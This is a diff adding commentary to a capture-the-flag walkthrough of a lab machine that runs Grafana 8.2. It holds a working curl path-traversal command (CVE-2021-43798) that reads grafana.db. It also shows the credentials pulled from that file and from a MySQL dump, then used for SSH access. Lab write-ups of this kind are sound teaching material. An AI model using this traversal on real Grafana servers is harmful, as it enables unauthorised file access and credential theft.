@@ -139,6 +139,9 @@ Nmap done: 1 IP address (1 host up) scanned in 131.31 seconds
 403      GET        9l       28w      278c http://10.129.51.253/server-status
 ```
 
+![image](https://user-images.githubusercontent.com/105310322/193699279-feb25054-fb07-4c79-9ba4-ea5ae01264de.png)
+
+
 └─$ feroxbuster -u http://10.129.51.253:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
 
 WLD      GET        2l        2w       29c Got 302 for http://10.129.51.253:3000/43612f99366348e7940a2c4ca064091d (url length: 32)
@@ -238,6 +241,13 @@ WLD         -         -         - http://10.129.51.253:3000/3ca9506f5a03461685b7
 302      GET        2l        2w       54c http://10.129.51.253:3000/public/app/plugins/datasource => /public/app/plugins/datasource/
 
 
+Gave back a login screen, attempted login bypass with sql injection but had no luck.
+
+![image](https://user-images.githubusercontent.com/105310322/193699522-4de4729e-b5b5-4eb3-9ffd-d62293f07f64.png)
+
+
+Found an exploit for grafana that allowed you to read files. We can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.
+
 https://www.exploit-db.com/exploits/50581
 
 ```console
@@ -282,6 +292,8 @@ mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 consul:x:997:997::/home/consul:/bin/false
 ```
 
+I had problems running this exploit but this page gave some good insight on what files to look for. Doing so gave me some login information.
+
 https://github.com/jas502n/Grafana-CVE-2021-43798
 
 /var/lib/grafana/grafana.db
@@ -290,3 +302,74 @@ https://github.com/jas502n/Grafana-CVE-2021-43798
 
 admin
 messageInABottle685427
+
+However when I used it to read the grafana.db file it was not giving me the full password so I instead had to pull the file with curl and then view it with sqlitebrowser.
+
+```curl -u admin:messageInABottle685427 --path-as-is http://10.129.52.15:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db```
+
+Grafana
+dontStandSoCloseToMe63221!
+
+
+![image](https://user-images.githubusercontent.com/105310322/193697435-4d0f1c62-016a-48dd-bbf6-cb44fd87f056.png)
+
+
+```console
+└──╼ [★]$ mysql -h 10.129.52.15 -u grafana -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 10
+Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+```
+
+```console
+└──╼ [★]$ mysqldump -h 10.129.52.15 -u grafana -p --all-databases > mysql
+└──╼ [★]$ cat mysql | grep developer
+```
+
+```INSERT INTO `users` VALUES ('developer','YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==');```
+
+developer
+anEnglishManInNewYork027468
+
+```console
+└──╼ [★]$ ssh developer@10.129.52.15
+developer@10.129.52.15's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 03 Oct 2022 10:44:54 PM UTC
+
+  System load:           0.0
+  Usage of /:            80.8% of 5.07GB
+  Memory usage:          41%
+  Swap usage:            0%
+  Processes:             228
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.52.15
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:c657
+
+
+0 updates can be applied immediately.
+
+
+Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
+developer@ambassador:~$ cat user.txt
+6c698***************************
+```
+
+```console
+developer@ambassador:~$ sudo -l
+[sudo] password for developer: 
+Sorry, user developer may not run sudo on ambassador.
+developer@ambassador:~$ 
+```
